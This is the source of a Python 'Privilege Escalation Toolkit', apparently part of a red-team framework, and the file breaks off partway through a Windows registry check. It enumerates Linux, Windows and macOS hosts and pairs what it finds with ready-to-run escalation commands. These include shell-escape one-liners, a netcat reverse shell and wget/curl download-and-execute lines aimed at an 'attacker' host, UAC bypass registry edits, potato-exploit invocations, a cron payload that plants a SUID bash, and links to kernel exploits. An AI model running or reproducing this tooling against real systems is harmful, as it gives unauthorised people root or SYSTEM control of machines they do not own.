#!/usr/bin/env python3
"""
╔═══════════════════════════════════════════════════════════════════════════╗
║                    PRIVILEGE ESCALATION TOOLKIT                            ║
║           Windows/Linux/macOS Automated Privilege Escalation               ║
╚═══════════════════════════════════════════════════════════════════════════╝

Professional privilege escalation toolkit with:
- Windows privilege escalation (services, DLL hijacking, token manipulation)
- Linux privilege escalation (SUID/SGID, cron, capabilities, kernel exploits)
- macOS privilege escalation (TCC bypass, entitlements)
- Kernel exploit database integration
- Misconfigured services scanner
- Automated escalation path finder

Author: Monolith Red Team Framework
Version: 1.0.0
"""

import json
import sqlite3
import subprocess
import os
import platform
from dataclasses import dataclass, field, asdict
from datetime import datetime
from enum import Enum
from pathlib import Path
from typing import Dict, List, Optional, Any, Tuple
import logging
import re
import hashlib
import threading
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


class OperatingSystem(Enum):
    """Target operating system"""
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    UNKNOWN = "unknown"


class PrivescTechnique(Enum):
    """Privilege escalation techniques"""
    # Windows
    WINDOWS_SERVICE_MISCONFIGURATION = "windows_service_misconfiguration"
    WINDOWS_UNQUOTED_SERVICE_PATH = "windows_unquoted_service_path"
    WINDOWS_DLL_HIJACKING = "windows_dll_hijacking"
    WINDOWS_TOKEN_MANIPULATION = "windows_token_manipulation"
    WINDOWS_REGISTRY_AUTORUN = "windows_registry_autorun"
    WINDOWS_SCHEDULED_TASK = "windows_scheduled_task"
    WINDOWS_ALWAYS_INSTALL_ELEVATED = "windows_always_install_elevated"
    WINDOWS_STORED_CREDENTIALS = "windows_stored_credentials"
    WINDOWS_UAC_BYPASS = "windows_uac_bypass"
    WINDOWS_POTATO_ATTACK = "windows_potato_attack"
    WINDOWS_PRINTSPOOFER = "windows_printspoofer"
    
    # Linux
    LINUX_SUID_SGID = "linux_suid_sgid"
    LINUX_SUDO_MISCONFIGURATION = "linux_sudo_misconfiguration"
    LINUX_CRON_JOBS = "linux_cron_jobs"
    LINUX_CAPABILITIES = "linux_capabilities"
    LINUX_KERNEL_EXPLOIT = "linux_kernel_exploit"
    LINUX_WRITABLE_PASSWD = "linux_writable_passwd"
    LINUX_WRITABLE_SHADOW = "linux_writable_shadow"
    LINUX_NFS_ROOT_SQUASHING = "linux_nfs_root_squashing"
    LINUX_DOCKER_ESCAPE = "linux_docker_escape"
    LINUX_LXC_ESCAPE = "linux_lxc_escape"
    LINUX_PATH_HIJACKING = "linux_path_hijacking"
    LINUX_LD_PRELOAD = "linux_ld_preload"
    LINUX_WILDCARD_INJECTION = "linux_wildcard_injection"
    
    # macOS
    MACOS_TCC_BYPASS = "macos_tcc_bypass"
    MACOS_ENTITLEMENTS = "macos_entitlements"
    MACOS_DYLIB_HIJACKING = "macos_dylib_hijacking"
    MACOS_INSTALLER_ABUSE = "macos_installer_abuse"


class Severity(Enum):
    """Vulnerability severity"""
    CRITICAL = "critical"
    HIGH = "high"
    MEDIUM = "medium"
    LOW = "low"
    INFO = "info"


class Exploitability(Enum):
    """Exploitability level"""
    TRIVIAL = "trivial"
    EASY = "easy"
    MODERATE = "moderate"
    DIFFICULT = "difficult"


@dataclass
class PrivescVector:
    """Privilege escalation vector"""
    technique: PrivescTechnique
    severity: Severity
    exploitability: Exploitability
    target_os: OperatingSystem
    current_user: str
    target_privilege: str
    vulnerability: str
    description: str
    exploit_command: str = ""
    exploit_script: str = ""
    requirements: List[str] = field(default_factory=list)
    mitigation: str = ""
    references: List[str] = field(default_factory=list)
    cve_id: str = ""
    confidence: int = 0  # 0-100
    discovered_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    
    def to_dict(self) -> Dict[str, Any]:
        d = asdict(self)
        d['technique'] = self.technique.value
        d['severity'] = self.severity.value
        d['exploitability'] = self.exploitability.value
        d['target_os'] = self.target_os.value
        return d


@dataclass
class KernelExploit:
    """Kernel exploit information"""
    name: str
    cve_id: str
    affected_versions: List[str]
    target_os: OperatingSystem
    exploit_url: str
    description: str
    success_rate: int = 0
    requires_compilation: bool = True


@dataclass
class ScanJob:
    """Privilege escalation scan job"""
    job_id: str
    target_os: OperatingSystem
    current_user: str
    scan_type: str  # quick, full, comprehensive
    status: str = "queued"
    progress: int = 0
    vectors: List[PrivescVector] = field(default_factory=list)
    kernel_exploits: List[KernelExploit] = field(default_factory=list)
    system_info: Dict[str, Any] = field(default_factory=dict)
    started_at: str = field(default_factory=lambda: datetime.utcnow().isoformat())
    completed_at: Optional[str] = None
    error_message: Optional[str] = None


class PrivilegeEscalationToolkit:
    """Professional privilege escalation toolkit"""
    
    _instance = None
    _lock = threading.Lock()
    
    def __new__(cls):
        if cls._instance is None:
            with cls._lock:
                if cls._instance is None:
                    cls._instance = super().__new__(cls)
        return cls._instance
    
    def __init__(self):
        if hasattr(self, '_initialized'):
            return
        self._initialized = True
        
        self.db_path = Path("/tmp/privesc_toolkit.db")
        self.jobs: Dict[str, ScanJob] = {}
        self._init_database()
        
        # Load exploit databases
        self.kernel_exploits = self._load_kernel_exploits()
        self.suid_gtfobins = self._load_gtfobins()
        self.windows_exploits = self._load_windows_exploits()
        
        logger.info("Privilege Escalation Toolkit initialized")
    
    def _init_database(self):
        """Initialize SQLite database"""
        with sqlite3.connect(self.db_path) as conn:
            conn.execute("""
                CREATE TABLE IF NOT EXISTS scan_jobs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    job_id TEXT UNIQUE NOT NULL,
                    target_os TEXT,
                    current_user TEXT,
                    scan_type TEXT,
                    status TEXT,
                    vector_count INTEGER,
                    started_at TEXT,
                    completed_at TEXT
                )
            """)
            
            conn.execute("""
                CREATE TABLE IF NOT EXISTS privesc_vectors (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    job_id TEXT NOT NULL,
                    technique TEXT,
                    severity TEXT,
                    exploitability TEXT,
                    vulnerability TEXT,
                    description TEXT,
                    exploit_command TEXT,
                    confidence INTEGER,
                    discovered_at TEXT
                )
            """)
            
            conn.commit()
    
    def _load_kernel_exploits(self) -> Dict[str, List[KernelExploit]]:
        """Load kernel exploit database"""
        return {
            "linux": [
                KernelExploit(
                    name="DirtyPipe",
                    cve_id="CVE-2022-0847",
                    affected_versions=["5.8", "5.9", "5.10", "5.11", "5.12", "5.13", "5.14", "5.15", "5.16"],
                    target_os=OperatingSystem.LINUX,
                    exploit_url="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits",
                    description="Arbitrary file overwrite vulnerability in Linux kernel pipe implementation",
                    success_rate=95,
                    requires_compilation=True
                ),
                KernelExploit(
                    name="DirtyCow",
                    cve_id="CVE-2016-5195",
                    affected_versions=["2.6.22", "4.8.3"],
                    target_os=OperatingSystem.LINUX,
                    exploit_url="https://github.com/dirtycow/dirtycow.github.io",
                    description="Race condition in Linux kernel memory subsystem",
                    success_rate=85,
                    requires_compilation=True
                ),
                KernelExploit(
                    name="PwnKit",
                    cve_id="CVE-2021-4034",
                    affected_versions=["all"],
                    target_os=OperatingSystem.LINUX,
                    exploit_url="https://github.com/berdav/CVE-2021-4034",
                    description="Polkit pkexec local privilege escalation",
                    success_rate=99,
                    requires_compilation=True
                ),
                KernelExploit(
                    name="Baron Samedit",
                    cve_id="CVE-2021-3156",
                    affected_versions=["1.8.2", "1.9.5p2"],
                    target_os=OperatingSystem.LINUX,
                    exploit_url="https://github.com/blasty/CVE-2021-3156",
                    description="Sudo heap overflow vulnerability",
                    success_rate=90,
                    requires_compilation=True
                ),
            ],
            "windows": [
                KernelExploit(
                    name="PrintNightmare",
                    cve_id="CVE-2021-34527",
                    affected_versions=["Windows 7", "Windows 10", "Windows Server 2019"],
                    target_os=OperatingSystem.WINDOWS,
                    exploit_url="https://github.com/cube0x0/CVE-2021-1675",
                    description="Windows Print Spooler RCE/LPE vulnerability",
                    success_rate=85,
                    requires_compilation=False
                ),
                KernelExploit(
                    name="HiveNightmare",
                    cve_id="CVE-2021-36934",
                    affected_versions=["Windows 10 1809+"],
                    target_os=OperatingSystem.WINDOWS,
                    exploit_url="https://github.com/GossiTheDog/HiveNightmare",
                    description="SAM database ACL misconfiguration",
                    success_rate=95,
                    requires_compilation=False
                ),
            ]
        }
    
    def _load_gtfobins(self) -> Dict[str, Dict[str, str]]:
        """Load GTFOBins SUID exploitation database"""
        return {
            "bash": {
                "suid": "bash -p",
                "sudo": "sudo bash",
                "description": "Spawn privileged shell"
            },
            "python": {
                "suid": "python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
                "sudo": "sudo python -c 'import os; os.system(\"/bin/bash\")'",
                "description": "Python shell escape"
            },
            "python3": {
                "suid": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
                "sudo": "sudo python3 -c 'import os; os.system(\"/bin/bash\")'",
                "description": "Python3 shell escape"
            },
            "vim": {
                "suid": "vim -c ':!sh'",
                "sudo": "sudo vim -c ':!/bin/bash'",
                "description": "Vim shell escape"
            },
            "find": {
                "suid": "find . -exec /bin/sh -p \\; -quit",
                "sudo": "sudo find . -exec /bin/bash \\; -quit",
                "description": "Find command execution"
            },
            "nmap": {
                "suid": "nmap --interactive\n!sh",
                "sudo": "sudo nmap --interactive\n!sh",
                "description": "Nmap interactive shell (old versions)"
            },
            "awk": {
                "suid": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
                "sudo": "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
                "description": "AWK command execution"
            },
            "perl": {
                "suid": "perl -e 'exec \"/bin/sh\";'",
                "sudo": "sudo perl -e 'exec \"/bin/bash\";'",
                "description": "Perl shell execution"
            },
            "ruby": {
                "suid": "ruby -e 'exec \"/bin/sh -p\"'",
                "sudo": "sudo ruby -e 'exec \"/bin/bash\"'",
                "description": "Ruby shell execution"
            },
            "less": {
                "suid": "less /etc/passwd\n!/bin/sh",
                "sudo": "sudo less /etc/passwd\n!/bin/bash",
                "description": "Less shell escape"
            },
            "more": {
                "suid": "more /etc/passwd\n!/bin/sh",
                "sudo": "sudo more /etc/passwd\n!/bin/bash",
                "description": "More shell escape"
            },
            "nano": {
                "suid": "nano\n^R^X\nreset; sh 1>&0 2>&0",
                "sudo": "sudo nano -s /bin/bash",
                "description": "Nano shell escape"
            },
            "cp": {
                "suid": "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; /tmp/bash -p",
                "sudo": "sudo cp /bin/bash /tmp/bash && sudo chmod +s /tmp/bash && /tmp/bash -p",
                "description": "Copy bash with SUID"
            },
            "mv": {
                "suid": "Use to overwrite /etc/passwd",
                "sudo": "sudo mv /tmp/passwd /etc/passwd",
                "description": "Move files for privilege escalation"
            },
            "tar": {
                "suid": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
                "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash",
                "description": "Tar checkpoint action"
            },
            "zip": {
                "suid": "zip /tmp/test.zip /etc/passwd -T --unzip-command=\"sh -c /bin/sh\"",
                "sudo": "sudo zip /tmp/test.zip /etc/passwd -T --unzip-command=\"sh -c /bin/bash\"",
                "description": "Zip unzip command execution"
            },
            "gcc": {
                "suid": "gcc -wrapper /bin/sh,-s .",
                "sudo": "sudo gcc -wrapper /bin/bash,-s .",
                "description": "GCC wrapper execution"
            },
            "docker": {
                "suid": "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                "sudo": "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt bash",
                "description": "Docker container escape"
            },
            "env": {
                "suid": "env /bin/sh -p",
                "sudo": "sudo env /bin/bash",
                "description": "Env shell execution"
            },
            "ftp": {
                "suid": "ftp\n!/bin/sh",
                "sudo": "sudo ftp\n!/bin/bash",
                "description": "FTP shell escape"
            },
            "gdb": {
                "suid": "gdb -nx -ex '!sh' -ex quit",
                "sudo": "sudo gdb -nx -ex '!bash' -ex quit",
                "description": "GDB shell execution"
            },
            "git": {
                "suid": "git help config\n!/bin/sh",
                "sudo": "sudo git -p help config\n!/bin/bash",
                "description": "Git pager shell escape"
            },
            "man": {
                "suid": "man man\n!/bin/sh",
                "sudo": "sudo man man\n!/bin/bash",
                "description": "Man pager shell escape"
            },
            "ssh": {
                "suid": "ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
                "sudo": "sudo ssh -o ProxyCommand=';bash 0<&2 1>&2' x",
                "description": "SSH proxy command"
            },
            "nc": {
                "suid": "nc -e /bin/sh attacker 1234",
                "sudo": "sudo nc -e /bin/bash attacker 1234",
                "description": "Netcat reverse shell"
            },
            "socat": {
                "suid": "socat stdin exec:/bin/sh",
                "sudo": "sudo socat stdin exec:/bin/bash",
                "description": "Socat shell execution"
            },
            "wget": {
                "suid": "TF=$(mktemp); chmod +x $TF; wget http://attacker/shell -O $TF; $TF",
                "sudo": "sudo wget http://attacker/shell -O /tmp/shell && sudo chmod +x /tmp/shell && /tmp/shell",
                "description": "Wget download and execute"
            },
            "curl": {
                "suid": "curl http://attacker/shell -o /tmp/shell && chmod +x /tmp/shell && /tmp/shell",
                "sudo": "sudo curl http://attacker/shell -o /tmp/shell && sudo chmod +x /tmp/shell && /tmp/shell",
                "description": "Curl download and execute"
            },
        }
    
    def _load_windows_exploits(self) -> Dict[str, Dict[str, Any]]:
        """Load Windows privilege escalation techniques"""
        return {
            "potato_attacks": {
                "JuicyPotato": {
                    "description": "SeImpersonatePrivilege to SYSTEM via DCOM",
                    "requirements": ["SeImpersonatePrivilege", "SeAssignPrimaryTokenPrivilege"],
                    "command": "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -a \"/c c:\\shell.exe\" -t *",
                    "affected": ["Windows 7", "Windows Server 2008", "Windows Server 2012", "Windows Server 2016"]
                },
                "SweetPotato": {
                    "description": "Collection of potato exploits",
                    "requirements": ["SeImpersonatePrivilege"],
                    "command": "SweetPotato.exe -a whoami",
                    "affected": ["Windows 10", "Windows Server 2019"]
                },
                "PrintSpoofer": {
                    "description": "Abuse print spooler for SYSTEM",
                    "requirements": ["SeImpersonatePrivilege"],
                    "command": "PrintSpoofer.exe -i -c cmd",
                    "affected": ["Windows 10", "Windows Server 2016", "Windows Server 2019"]
                },
                "GodPotato": {
                    "description": "Universal potato that works on all Windows versions",
                    "requirements": ["SeImpersonatePrivilege"],
                    "command": "GodPotato.exe -cmd \"cmd /c whoami\"",
                    "affected": ["Windows 8+", "Windows Server 2012+"]
                }
            },
            "uac_bypass": {
                "fodhelper": {
                    "description": "Bypass UAC via fodhelper.exe",
                    "requirements": ["Local admin group membership"],
                    "command": "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /f && fodhelper.exe",
                    "affected": ["Windows 10"]
                },
                "eventvwr": {
                    "description": "Bypass UAC via eventvwr.exe",
                    "requirements": ["Local admin group membership"],
                    "command": "reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d \"cmd.exe\" /f && eventvwr.exe",
                    "affected": ["Windows 7", "Windows 10"]
                },
                "computerdefaults": {
                    "description": "Bypass UAC via computerdefaults.exe",
                    "requirements": ["Local admin group membership"],
                    "command": "reg add HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command /d \"cmd.exe\" /f && computerdefaults.exe",
                    "affected": ["Windows 10"]
                }
            },
            "service_exploits": {
                "unquoted_service_path": {
                    "description": "Exploit unquoted service paths",
                    "requirements": ["Write access to service path"],
                    "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\"",
                    "affected": ["All Windows"]
                },
                "weak_service_permissions": {
                    "description": "Modify service binary or config",
                    "requirements": ["SERVICE_CHANGE_CONFIG or SERVICE_ALL_ACCESS"],
                    "command": "sc config [service] binPath= \"C:\\shell.exe\"",
                    "affected": ["All Windows"]
                },
                "dll_hijacking": {
                    "description": "Place malicious DLL in search path",
                    "requirements": ["Write access to DLL search path"],
                    "command": "procmon to find missing DLLs, then place malicious DLL",
                    "affected": ["All Windows"]
                }
            }
        }
    
    def start_scan(self, target_os: str = "auto", scan_type: str = "full") -> str:
        """Start privilege escalation scan"""
        job_id = hashlib.md5(f"{datetime.utcnow().isoformat()}".encode()).hexdigest()[:16]
        
        # Detect OS
        if target_os == "auto":
            detected_os = self._detect_os()
        else:
            detected_os = OperatingSystem(target_os.lower())
        
        current_user = self._get_current_user()
        
        job = ScanJob(
            job_id=job_id,
            target_os=detected_os,
            current_user=current_user,
            scan_type=scan_type
        )
        
        self.jobs[job_id] = job
        
        # Execute scan in background
        thread = threading.Thread(target=self._execute_scan, args=(job_id,))
        thread.daemon = True
        thread.start()
        
        logger.info(f"Started privesc scan {job_id} for {detected_os.value}")
        return job_id
    
    def _detect_os(self) -> OperatingSystem:
        """Detect current operating system"""
        system = platform.system().lower()
        if system == "linux":
            return OperatingSystem.LINUX
        elif system == "darwin":
            return OperatingSystem.MACOS
        elif system == "windows":
            return OperatingSystem.WINDOWS
        return OperatingSystem.UNKNOWN
    
    def _get_current_user(self) -> str:
        """Get current username"""
        try:
            return os.getlogin()
        except:
            return os.environ.get('USER', os.environ.get('USERNAME', 'unknown'))
    
    def _execute_scan(self, job_id: str):
        """Execute privilege escalation scan"""
        job = self.jobs[job_id]
        job.status = "running"
        
        try:
            # Phase 1: System enumeration (20%)
            logger.info(f"[{job_id}] Phase 1: System enumeration")
            job.system_info = self._enumerate_system(job.target_os)
            job.progress = 20
            
            # Phase 2: Check based on OS
            if job.target_os == OperatingSystem.LINUX:
                # Linux checks (60%)
                logger.info(f"[{job_id}] Phase 2: Linux privilege escalation checks")
                self._check_linux_suid(job)
                job.progress = 35
                self._check_linux_sudo(job)
                job.progress = 50
                self._check_linux_cron(job)
                job.progress = 60
                self._check_linux_capabilities(job)
                job.progress = 70
                self._check_linux_kernel(job)
                job.progress = 80
                
            elif job.target_os == OperatingSystem.WINDOWS:
                # Windows checks (60%)
                logger.info(f"[{job_id}] Phase 2: Windows privilege escalation checks")
                self._check_windows_services(job)
                job.progress = 40
                self._check_windows_privileges(job)
                job.progress = 55
                self._check_windows_registry(job)
                job.progress = 70
                self._check_windows_scheduled_tasks(job)
                job.progress = 85
                
            elif job.target_os == OperatingSystem.MACOS:
                # macOS checks
                logger.info(f"[{job_id}] Phase 2: macOS privilege escalation checks")
                self._check_macos_tcc(job)
                job.progress = 50
                self._check_macos_suid(job)
                job.progress = 70
            
            # Phase 3: Match kernel exploits (20%)
            logger.info(f"[{job_id}] Phase 3: Matching kernel exploits")
            self._match_kernel_exploits(job)
            job.progress = 100
            
            job.status = "completed"
            job.completed_at = datetime.utcnow().isoformat()
            
            # Save results
            self._save_results(job)
            
            logger.info(f"[{job_id}] Scan completed: {len(job.vectors)} vectors found")
            
        except Exception as e:
            job.status = "failed"
            job.error_message = str(e)
            logger.error(f"[{job_id}] Scan failed: {e}")
    
    def _enumerate_system(self, target_os: OperatingSystem) -> Dict[str, Any]:
        """Enumerate system information"""
        info = {
            "hostname": platform.node(),
            "os": platform.system(),
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
        }
        
        if target_os == OperatingSystem.LINUX:
            try:
                # Get kernel version
                result = subprocess.run(['uname', '-r'], capture_output=True, text=True, timeout=5)
                info['kernel'] = result.stdout.strip()
                
                # Get distribution
                if os.path.exists('/etc/os-release'):
                    with open('/etc/os-release', 'r') as f:
                        for line in f:
                            if line.startswith('PRETTY_NAME='):
                                info['distribution'] = line.split('=')[1].strip().strip('"')
                                break
            except:
                pass
        
        return info
    
    def _check_linux_suid(self, job: ScanJob):
        """Check for exploitable SUID binaries"""
        try:
            result = subprocess.run(
                ['find', '/', '-perm', '-4000', '-type', 'f'],
                capture_output=True, text=True, timeout=60
            )
            
            suid_files = result.stdout.strip().split('\n')
            
            for suid_file in suid_files:
                if not suid_file:
                    continue
                
                binary_name = os.path.basename(suid_file)
                
                # Check if it's in GTFOBins
                if binary_name in self.suid_gtfobins:
                    gtfo = self.suid_gtfobins[binary_name]
                    
                    vector = PrivescVector(
                        technique=PrivescTechnique.LINUX_SUID_SGID,
                        severity=Severity.HIGH,
                        exploitability=Exploitability.EASY,
                        target_os=OperatingSystem.LINUX,
                        current_user=job.current_user,
                        target_privilege="root",
                        vulnerability=f"SUID binary: {suid_file}",
                        description=f"Exploitable SUID binary found: {binary_name}. {gtfo['description']}",
                        exploit_command=gtfo['suid'],
                        requirements=["SUID bit set on binary"],
                        mitigation=f"Remove SUID bit: chmod u-s {suid_file}",
                        references=["https://gtfobins.github.io/"],
                        confidence=90
                    )
                    job.vectors.append(vector)
        except Exception as e:
            logger.debug(f"SUID check failed: {e}")
    
    def _check_linux_sudo(self, job: ScanJob):
        """Check sudo misconfigurations"""
        try:
            result = subprocess.run(['sudo', '-l'], capture_output=True, text=True, timeout=10)
            
            sudo_output = result.stdout + result.stderr
            
            # Check for NOPASSWD
            if 'NOPASSWD' in sudo_output:
                # Parse allowed commands
                for line in sudo_output.split('\n'):
                    if 'NOPASSWD' in line:
                        # Extract command
                        parts = line.split('NOPASSWD:')
                        if len(parts) > 1:
                            commands = parts[1].strip()
                            
                            # Check for dangerous commands
                            for cmd in commands.split(','):
                                cmd = cmd.strip()
                                binary = cmd.split()[0] if cmd else ""
                                binary_name = os.path.basename(binary)
                                
                                if binary_name in self.suid_gtfobins:
                                    gtfo = self.suid_gtfobins[binary_name]
                                    
                                    vector = PrivescVector(
                                        technique=PrivescTechnique.LINUX_SUDO_MISCONFIGURATION,
                                        severity=Severity.CRITICAL,
                                        exploitability=Exploitability.TRIVIAL,
                                        target_os=OperatingSystem.LINUX,
                                        current_user=job.current_user,
                                        target_privilege="root",
                                        vulnerability=f"sudo NOPASSWD: {cmd}",
                                        description=f"User can run {binary_name} as root without password. {gtfo['description']}",
                                        exploit_command=gtfo['sudo'],
                                        requirements=["sudo NOPASSWD configured"],
                                        mitigation="Remove NOPASSWD from sudoers or restrict commands",
                                        references=["https://gtfobins.github.io/"],
                                        confidence=95
                                    )
                                    job.vectors.append(vector)
                                
                                # Check for ALL commands
                                if cmd.strip() == 'ALL' or '(ALL)' in line:
                                    vector = PrivescVector(
                                        technique=PrivescTechnique.LINUX_SUDO_MISCONFIGURATION,
                                        severity=Severity.CRITICAL,
                                        exploitability=Exploitability.TRIVIAL,
                                        target_os=OperatingSystem.LINUX,
                                        current_user=job.current_user,
                                        target_privilege="root",
                                        vulnerability="sudo ALL NOPASSWD",
                                        description="User can run ANY command as root without password!",
                                        exploit_command="sudo su -",
                                        requirements=["sudo ALL NOPASSWD configured"],
                                        mitigation="Remove ALL NOPASSWD from sudoers",
                                        confidence=99
                                    )
                                    job.vectors.append(vector)
        except Exception as e:
            logger.debug(f"Sudo check failed: {e}")
    
    def _check_linux_cron(self, job: ScanJob):
        """Check for exploitable cron jobs"""
        cron_paths = [
            '/etc/crontab',
            '/etc/cron.d/',
            '/var/spool/cron/',
            '/var/spool/cron/crontabs/'
        ]
        
        try:
            for cron_path in cron_paths:
                if os.path.exists(cron_path):
                    if os.path.isfile(cron_path):
                        self._analyze_cron_file(cron_path, job)
                    elif os.path.isdir(cron_path):
                        for f in os.listdir(cron_path):
                            self._analyze_cron_file(os.path.join(cron_path, f), job)
        except Exception as e:
            logger.debug(f"Cron check failed: {e}")
    
    def _analyze_cron_file(self, filepath: str, job: ScanJob):
        """Analyze cron file for vulnerabilities"""
        try:
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line and not line.startswith('#'):
                        # Check if script is writable
                        parts = line.split()
                        if len(parts) >= 6:
                            cmd = ' '.join(parts[5:])
                            # Extract script path
                            script_path = cmd.split()[0] if cmd else ""
                            
                            if script_path and os.path.exists(script_path):
                                if os.access(script_path, os.W_OK):
                                    vector = PrivescVector(
                                        technique=PrivescTechnique.LINUX_CRON_JOBS,
                                        severity=Severity.HIGH,
                                        exploitability=Exploitability.EASY,
                                        target_os=OperatingSystem.LINUX,
                                        current_user=job.current_user,
                                        target_privilege="root",
                                        vulnerability=f"Writable cron script: {script_path}",
                                        description=f"Cron job runs writable script {script_path}",
                                        exploit_command=f"echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> {script_path}",
                                        requirements=["Write access to cron script"],
                                        mitigation="Set proper permissions on cron scripts",
                                        confidence=85
                                    )
                                    job.vectors.append(vector)
        except:
            pass
    
    def _check_linux_capabilities(self, job: ScanJob):
        """Check for dangerous Linux capabilities"""
        try:
            result = subprocess.run(
                ['getcap', '-r', '/'],
                capture_output=True, text=True, timeout=60
            )
            
            dangerous_caps = {
                'cap_setuid': 'Can change UID to root',
                'cap_setgid': 'Can change GID to root group',
                'cap_dac_override': 'Bypass file permission checks',
                'cap_dac_read_search': 'Bypass file read permission checks',
                'cap_sys_admin': 'Perform system administration operations',
                'cap_sys_ptrace': 'Trace arbitrary processes',
                'cap_net_admin': 'Perform network administration',
            }
            
            for line in result.stdout.split('\n'):
                if line:
                    parts = line.split()
                    if len(parts) >= 2:
                        binary = parts[0]
                        caps = parts[1].lower()
                        
                        for cap, desc in dangerous_caps.items():
                            if cap in caps:
                                vector = PrivescVector(
                                    technique=PrivescTechnique.LINUX_CAPABILITIES,
                                    severity=Severity.HIGH,
                                    exploitability=Exploitability.MODERATE,
                                    target_os=OperatingSystem.LINUX,
                                    current_user=job.current_user,
                                    target_privilege="root",
                                    vulnerability=f"Dangerous capability on {binary}: {cap}",
                                    description=f"{binary} has {cap} capability. {desc}",
                                    exploit_command=f"# Exploit {binary} with {cap}",
                                    requirements=[f"{cap} capability set"],
                                    mitigation=f"Remove capability: setcap -r {binary}",
                                    confidence=75
                                )
                                job.vectors.append(vector)
        except Exception as e:
            logger.debug(f"Capabilities check failed: {e}")
    
    def _check_linux_kernel(self, job: ScanJob):
        """Check for kernel exploits"""
        kernel_version = job.system_info.get('kernel', '')
        
        for exploit in self.kernel_exploits.get('linux', []):
            for affected in exploit.affected_versions:
                if affected in kernel_version or affected == "all":
                    job.kernel_exploits.append(exploit)
                    
                    vector = PrivescVector(
                        technique=PrivescTechnique.LINUX_KERNEL_EXPLOIT,
                        severity=Severity.CRITICAL,
                        exploitability=Exploitability.MODERATE,
                        target_os=OperatingSystem.LINUX,
                        current_user=job.current_user,
                        target_privilege="root",
                        vulnerability=f"Kernel vulnerable to {exploit.name}",
                        description=exploit.description,
                        exploit_command=f"# Download and compile from {exploit.exploit_url}",
                        requirements=["Vulnerable kernel version", "gcc (if compilation needed)"],
                        mitigation="Update kernel to patched version",
                        cve_id=exploit.cve_id,
                        references=[exploit.exploit_url],
                        confidence=exploit.success_rate
                    )
                    job.vectors.append(vector)
                    break
    
    def _check_windows_services(self, job: ScanJob):
        """Check Windows service misconfigurations"""
        # Mock implementation for non-Windows systems
        if platform.system() != 'Windows':
            return
        
        try:
            # Check unquoted service paths
            result = subprocess.run(
                ['wmic', 'service', 'get', 'name,displayname,pathname,startmode'],
                capture_output=True, text=True, timeout=30
            )
            
            for line in result.stdout.split('\n'):
                # Check for unquoted paths with spaces
                if ' ' in line and 'C:\\' in line:
                    if '"' not in line.split('C:\\')[1].split('.exe')[0]:
                        vector = PrivescVector(
                            technique=PrivescTechnique.WINDOWS_UNQUOTED_SERVICE_PATH,
                            severity=Severity.HIGH,
                            exploitability=Exploitability.MODERATE,
                            target_os=OperatingSystem.WINDOWS,
                            current_user=job.current_user,
                            target_privilege="SYSTEM",
                            vulnerability=f"Unquoted service path: {line.strip()}",
                            description="Service path contains spaces and is not quoted",
                            exploit_command="Place malicious exe in writable path segment",
                            requirements=["Write access to path segment"],
                            mitigation="Quote service paths in registry",
                            confidence=70
                        )
                        job.vectors.append(vector)
        except Exception as e:
            logger.debug(f"Windows service check failed: {e}")
    
    def _check_windows_privileges(self, job: ScanJob):
        """Check Windows token privileges"""
        if platform.system() != 'Windows':
            return
        
        try:
            result = subprocess.run(['whoami', '/priv'], capture_output=True, text=True, timeout=10)
            
            dangerous_privs = {
                'SeImpersonatePrivilege': self.windows_exploits['potato_attacks'],
                'SeAssignPrimaryTokenPrivilege': self.windows_exploits['potato_attacks'],
                'SeBackupPrivilege': {'description': 'Can backup any file including SAM'},
                'SeRestorePrivilege': {'description': 'Can restore any file'},
                'SeTakeOwnershipPrivilege': {'description': 'Can take ownership of any file'},
                'SeDebugPrivilege': {'description': 'Can debug any process'},
                'SeLoadDriverPrivilege': {'description': 'Can load kernel drivers'},
            }
            
            for priv, info in dangerous_privs.items():
                if priv in result.stdout and 'Enabled' in result.stdout:
                    vector = PrivescVector(
                        technique=PrivescTechnique.WINDOWS_TOKEN_MANIPULATION,
                        severity=Severity.CRITICAL,
                        exploitability=Exploitability.EASY,
                        target_os=OperatingSystem.WINDOWS,
                        current_user=job.current_user,
                        target_privilege="SYSTEM",
                        vulnerability=f"Dangerous privilege: {priv}",
                        description=f"{priv} is enabled. Can escalate to SYSTEM.",
                        exploit_command="Use PrintSpoofer, JuicyPotato, or GodPotato",
                        requirements=[f"{priv} enabled"],
                        mitigation="Remove unnecessary privileges",
                        confidence=90
                    )
                    job.vectors.append(vector)
        except Exception as e:
            logger.debug(f"Windows privilege check failed: {e}")
    
    def _check_windows_registry(self, job: ScanJob):
        """Check Windows registry for privilege escalation"""
        if platform.system() != 'Windows':
            return
        
        try:
            # Check AlwaysInstallElevated
            result = subprocess.run(
                ['reg', 'query', 'HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer', '/v', 'AlwaysInstallElevated'],
                capture_output=True, text=True, timeout=10
            )
            
            if '0x1' in result.stdout:
                vector = PrivescVector(
